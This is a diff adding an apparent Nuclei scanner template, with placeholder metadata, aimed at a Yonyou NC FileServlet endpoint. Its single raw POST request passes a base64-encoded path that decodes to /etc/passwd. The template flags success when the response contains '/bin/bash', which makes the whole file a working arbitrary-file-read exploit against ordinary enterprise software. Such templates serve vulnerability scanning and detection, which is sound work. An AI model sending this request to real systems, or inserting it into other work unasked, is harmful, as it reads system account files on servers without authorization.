@@ -1,0 +1,36 @@
+id: yonyou-FileServlet-file
+
+info:
+  name: WebFuzzer Template nvKqFTkn
+  author: god
+  severity: high
+  description: write your description here
+  metadata:
+    max-request: 1
+    shodan-query: ""
+    verified: true
+
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /servlet/nc.bs.hr.tools.trans.FileServlet HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+    Content-Length: 21
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip
+
+    path=L2V0Yy9wYXNzd2Q=
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '/bin/bash'
